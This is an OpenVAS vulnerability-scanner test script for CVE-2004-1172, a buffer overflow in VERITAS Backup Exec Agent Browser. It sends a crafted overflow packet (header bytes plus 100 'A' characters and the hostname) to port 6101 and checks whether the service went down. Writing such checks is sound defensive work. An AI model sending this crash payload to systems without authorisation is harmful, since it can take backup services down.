###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_veritas_backup_exec_agent_browser_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# VERITAS Backup Exec Agent Browser Remote Buffer Overflow Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to overflow a buffer and
  execute arbitrary code on the system.
  Impact Level: System/Application";
tag_affected = "Veritas Backup Exec Agent Browser version 8.x before 8.60.3878 Hotfix 68,
  and 9.x before 9.1.4691 Hotfix 40";
tag_insight = "The name server registration service (benetns.exe) fails to validate the
  client hostname field during the registration process, which leads into
  stack-based buffer overflow.";
tag_solution = "Upgrade to Veritas Backup Exec Agent Browser 8.60.3878 Hotfix 68 or
  9.1.4691 Hotfix 40 or later,
  For updates refer to http://www.symantec.com/index.jsp";
tag_summary = "This host is running VERITAS Backup Exec Agent Browser and is prone
  to buffer overflow vulnerability.";

if(description)
{
  script_id(802981);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2004-1172");
  script_bugtraq_id(11974);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-11 13:42:29 +0530 (Thu, 11 Oct 2012)");
  script_name("VERITAS Backup Exec Agent Browser Remote Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/13495");
  script_xref(name : "URL" , value : "http://www.osvdb.org/show/osvdb/12418");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/907729");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/750/");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/18506");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/fulldisclosure/2005-01/0318.html");
  script_xref(name : "URL" , value : "http://www.hitachi.co.jp/Prod/comp/soft1/global/security/pdf/HS05-002.pdf");

  script_description(desc);
  script_summary("Check if VERITAS Backup Exec Agent Browser is prone to BOF vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports(6101);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Get the port
port = 6101;

## Variable Initialization
soc = "";
req  = "";
hostname  = "";


## Check port state
if(!get_port_state(port)){
  exit (0);
}

hostname = get_host_name();
if(!hostname){
  exit(0);
}

## open socket
soc = open_sock_tcp (port);
if(!soc){
  exit (0);
}

## Construct the request
req = raw_string (0x02, 0x00, 0x00, 0x00) + crap (data:'A', length:100) +
      raw_string (0x00) + hostname + raw_string (0x00);


## Send request
send (socket:soc, data:req);

## Close the socket
close (soc);

sleep(5);

## Open the socket to confirm exploit is working or not
soc = open_sock_tcp (port);
if(!soc)
{
  security_hole(port);
  exit(0);
}

close(soc);
